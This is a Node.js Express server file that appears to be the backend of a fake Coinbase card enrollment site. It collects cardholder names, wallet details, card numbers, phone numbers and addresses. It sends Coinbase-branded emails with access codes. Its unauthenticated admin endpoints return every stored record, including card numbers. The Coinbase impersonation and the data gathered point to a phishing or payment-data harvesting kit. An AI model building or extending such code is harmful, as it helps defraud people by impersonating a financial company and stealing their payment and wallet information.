require('dotenv').config();
const express    = require('express');
const { Pool }   = require('pg');
const cors       = require('cors');
const path       = require('path');
const nodemailer = require('nodemailer');

const app  = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname)));

// ── PostgreSQL (Railway) ────────────────────────────────────────
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false },
});

async function initDB() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS enrollments (
      id          SERIAL PRIMARY KEY,
      card_type   TEXT,
      wallet      TEXT,
      cardholder  TEXT,
      attestation TEXT,
      email       TEXT,
      phone       TEXT,
      address     TEXT,
      access_code TEXT,
      card_number TEXT,
      created_at  TIMESTAMPTZ DEFAULT NOW()
    )
  `);
  // add access_code column if upgrading from old schema
  await pool.query(`
    ALTER TABLE enrollments ADD COLUMN IF NOT EXISTS access_code TEXT;
    ALTER TABLE enrollments ADD COLUMN IF NOT EXISTS card_number TEXT;
  `);
  console.log('✅ DB ready');
}

// ── SMTP email client ───────────────────────────────────────────
const mailer = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: Number(process.env.SMTP_PORT) || 587,
  secure: Number(process.env.SMTP_PORT) === 465,
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS,
  },
});

function generateCode() {
  return String(Math.floor(100000 + Math.random() * 900000));
}

async function sendAccessEmail(to, name, code, cardType) {
  const html = `
    <div style="font-family:Inter,sans-serif;max-width:480px;margin:0 auto;background:#fff;border:1px solid #E8EAED;border-radius:16px;overflow:hidden">
      <div style="background:#0052FF;padding:24px 28px">
        <svg width="100" height="20" viewBox="0 0 116 24" fill="none">
          <circle cx="12" cy="12" r="12" fill="#fff" fill-opacity=".2"/>
          <path d="M12 5.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/>
          <text x="28" y="17" font-family="Inter,sans-serif" font-size="16" font-weight="700" fill="#fff">coinbase</text>
        </svg>
      </div>
      <div style="padding:32px 28px">
        <p style="margin:0 0 8px;font-size:22px;font-weight:800;color:#0A0B0D">Your card is ready, ${name}!</p>
        <p style="margin:0 0 24px;font-size:14px;color:#6B7280;line-height:1.6">
          Your Coinbase ${cardType === 'physical' ? 'Physical' : 'Virtual'} Card enrollment is confirmed.
          Use the code below to access your card on the portal.
        </p>
        <div style="background:#F7F8FA;border:1px solid #E8EAED;border-radius:12px;padding:20px;text-align:center;margin-bottom:24px">
          <p style="margin:0 0 8px;font-size:11px;font-weight:700;color:#6B7280;text-transform:uppercase;letter-spacing:.08em">Your Card Access Code</p>
          <p style="margin:0;font-size:40px;font-weight:800;color:#0052FF;letter-spacing:.2em;font-family:monospace">${code}</p>
        </div>
        <p style="margin:0 0 20px;font-size:13px;color:#6B7280;line-height:1.6">
          Go to the card portal, enter your email and this code to view your card details.
        </p>
        <a href="http://localhost:${PORT}/portal.html"
           style="display:inline-block;background:#0052FF;color:#fff;text-decoration:none;padding:14px 28px;border-radius:10px;font-weight:700;font-size:14px">
          View My Card →
        </a>
      </div>
      <div style="padding:16px 28px;border-top:1px solid #E8EAED;font-size:11px;color:#9CA3AF">
        This code is unique to your enrollment. Keep it safe.
      </div>
    </div>
  `;

  await mailer.sendMail({
    from: process.env.EMAIL_FROM,
    to,
    subject: `Your Coinbase Card Access Code: ${code}`,
    html,
  });
}

// ── POST /api/enroll ────────────────────────────────────────────
app.post('/api/enroll', async (req, res) => {
  const { cardType, wallet, cardholder, attestation, email, phone, address, cardNumber } = req.body;

  if (!cardholder || !attestation) {
    return res.status(400).json({ error: 'Missing required fields' });
  }

  const code = generateCode();

  try {
    const result = await pool.query(
      `INSERT INTO enrollments
         (card_type, wallet, cardholder, attestation, email, phone, address, access_code, card_number)
       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9)
       RETURNING id, created_at`,
      [cardType, wallet, cardholder, attestation, email || null, phone || null, address || null, code, cardNumber || null]
    );

    const row = result.rows[0];
    console.log(`[${new Date().toISOString()}] Enrollment #${row.id}: ${cardholder} | code: ${code}`);

    // Send access code email (non-blocking — don't fail enrollment if email fails)
    if (email) {
      sendAccessEmail(email, cardholder, code, cardType)
        .then(() => console.log(`📧 Access code emailed to ${email}`))
        .catch(err => console.warn(`Email failed: ${err.message}`));
    }

    res.json({ success: true, id: row.id, code });
  } catch (err) {
    console.error('DB error:', err.message);
    res.status(500).json({ error: 'Database error' });
  }
});

// ── POST /api/verify-card ───────────────────────────────────────
// Portal lookup: email + code → return card data
app.post('/api/verify-card', async (req, res) => {
  const { email, code } = req.body;

  if (!email || !code) {
    return res.status(400).json({ error: 'Email and code required' });
  }

  try {
    const result = await pool.query(
      `SELECT id, card_type, cardholder, card_number, created_at
       FROM enrollments
       WHERE LOWER(email) = LOWER($1) AND access_code = $2
       ORDER BY created_at DESC
       LIMIT 1`,
      [email.trim(), code.trim()]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'No card found. Check your email and code.' });
    }

    const row = result.rows[0];
    res.json({
      success: true,
      cardholder: row.cardholder,
      cardType:   row.card_type,
      cardNumber: row.card_number,
      enrolledAt: row.created_at,
    });
  } catch (err) {
    console.error('Verify error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ── GET /api/enrollments (quick summary) ───────────────────────
app.get('/api/enrollments', async (_req, res) => {
  try {
    const result = await pool.query(
      'SELECT id, card_type, cardholder, email, phone, created_at FROM enrollments ORDER BY created_at DESC LIMIT 100'
    );
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ── GET /api/enrollments/full (admin — all columns) ─────────────
app.get('/api/enrollments/full', async (_req, res) => {
  try {
    const result = await pool.query(
      'SELECT id, card_type, cardholder, email, phone, card_number, access_code, created_at FROM enrollments ORDER BY created_at DESC'
    );
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ── DELETE /api/enrollments/:id ────────────────────────────────
app.delete('/api/enrollments/:id', async (req, res) => {
  const id = parseInt(req.params.id);
  if (!id) return res.status(400).json({ error: 'Invalid id' });
  try {
    await pool.query('DELETE FROM enrollments WHERE id = $1', [id]);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ── Start ───────────────────────────────────────────────────────
initDB()
  .then(() => app.listen(PORT, () => {
    console.log(`\n🚀 Server → http://localhost:${PORT}`);
    console.log(`📋 Enrollments → http://localhost:${PORT}/api/enrollments\n`);
  }))
  .catch(err => {
    console.error('DB init failed:', err.message);
    app.listen(PORT, () => console.log(`⚠️  Running without DB on port ${PORT}`));
  });
